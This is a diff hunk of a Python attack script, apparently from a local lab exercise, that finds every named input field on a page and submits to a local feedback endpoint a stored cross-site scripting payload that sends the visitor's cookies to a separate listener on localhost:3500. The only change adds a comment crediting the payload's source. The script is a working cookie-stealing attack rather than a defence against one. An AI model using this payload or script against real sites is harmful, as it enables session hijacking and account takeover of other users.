@@ -15,7 +15,7 @@ def main():
     search = [(element['name']) for element in soup.find_all('input', attrs={'name': True})] # code from https://stackoverflow.com/a/23001729
     print(search)
     for x in search:
-        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"})
+        payload.update({x : "<script>var i=new Image;i.src=\"http://localhost:3500/?\"+document.cookie;</script>"}) # javascript code from https://github.com/s0wr0b1ndef/WebHacking101/blob/master/xss-reflected-steal-cookie.md#2-silent-one-liner
     r = session.post('http://localhost:5000/feedback',payload)
     print("Payload sent")
 
